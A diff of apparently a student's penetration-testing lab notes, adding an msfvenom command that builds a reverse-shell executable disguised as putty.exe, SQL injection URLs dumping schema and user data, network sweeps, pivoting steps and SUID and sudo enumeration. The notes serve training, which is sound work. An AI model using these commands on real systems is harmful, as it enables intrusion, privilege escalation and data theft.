@@ -272,6 +272,7 @@ set LPORT 6969
 ###REPLACING EXE###
 (1) Try to rename .exe being ran
 (2) Create new exe |  msfvenom -p windows/exec CMD='cmd.exe /C "hostname" > C:\Users\student\Desktop\hostname.txt' -f exe > putty.exe
+                      msfvenom -p windows/shell/reverse_tcp LHOST=<WINOPS> LPORT=<LIN_OPS_PORT> -f exe > putty.exe         #USE MULTI/HANDLER TO CONNECT
 (3) scp it to windows target and run service (or restart box)
 
 ###VIEWING AUDITING POLICY###
@@ -280,19 +281,22 @@ auditpol /get /category:* | findstr /i "success failure"
       ###DRY RUN NOTES###
  for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done #PING SCRIPT   #MAKE SURE YOU HAVE A BASH SHELL /bin/bash
 https://app.diagrams.net/                             #MAP SOFTWARE
-
-http://127.0.0.1:1111/pick.php?product=1' OR 1='1
-http://127.0.0.1:1111/pick.php?product=2' OR 1='1
-http://127.0.0.1:1111/pick.php?product=3' OR 1='1
-http://127.0.0.1:1111/pick.php?product=4' OR 1='1
-http://127.0.0.1:1111/pick.php?product=5' OR 1='1
-http://127.0.0.1:1111/pick.php?product=6' OR 1='1
-http://127.0.0.1:1111/pick.php?product=7' OR 1='1                            #GIVES AN ERROR
-http://127.0.0.1:1111/pick.php?product=7 UNION SELECT 1,2,3; #               #GIVES THE 3 COLUMN NAMES
+----------------------------------------------------------------------------------------------------------------------------
+                                      ###DONE IN THE URL###
+http://127.0.0.1:1111/pick.php?product=1 OR 1=1
+http://127.0.0.1:1111/pick.php?product=2 OR 1=1
+http://127.0.0.1:1111/pick.php?product=3 OR 1=1
+http://127.0.0.1:1111/pick.php?product=4 OR 1=1
+http://127.0.0.1:1111/pick.php?product=5 OR 1=1
+http://127.0.0.1:1111/pick.php?product=6 OR 1=1
+http://127.0.0.1:1111/pick.php?product=7 OR 1=1                                                                            #TRUTH STATEMENT WORKS
+http://127.0.0.1:1111/pick.php?product=7 UNION SELECT 1,2,3                                                                #GIVES THE 3 COLUMN NAMES IN ORDER 1,3,2
 http://127.0.0.1:1111/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
-http://127.0.0.1:1111/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users                        #ROT13 ENCRYPTED POSSIBLE
+                                                            1            3          2
+http://127.0.0.1:1111/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users                           #USER DATA ROT13 ENCRYPTED POSSIBLE
 
-IF BOX HAS PORT 9999 CHECK FOR SERCURESERVER TO DO WINDOWS BUFFER OVERFLOW EXPLOIT
+###IF BOX HAS PORT 9999 CHECK FOR SERCURESERVER TO DO WINDOWS BUFFER OVERFLOW EXPLOIT###
+----------------------------------------------------------------------------------------------------------------------------
 
 (1) Scan First Potential Box | nmap -Pn -sV -T5 <targetip>
 (2) Make Tunnel To HTTP Port and Enumerate Website to Find Possible Vulnerable Input Fields
@@ -309,7 +313,8 @@ IF BOX HAS PORT 9999 CHECK FOR SERCURESERVER TO DO WINDOWS BUFFER OVERFLOW EXPLO
 (10) cat /etc/hosts | for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done | SCAN NETWORK THAT DISCOVERED HOST WAS ON
 (11) CREATE DYNAMIC PORT TO BE ABLE TO SCAN DISCOVERED HOSTS
 (12) SCAN DISCOVERED HOSTS WITH NMAP TO DISCOVER PORTS | nmap -Pn -T5 -Sv -vvvv 192.168.28.172,181
-
+(13) CREATE PORT FORWARDS TO NEWLY DISCOVERED HOSTS AND THEIR ASSOICIATED PORTS
+(14) GET ONTO BOX AND ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r
 
 
 
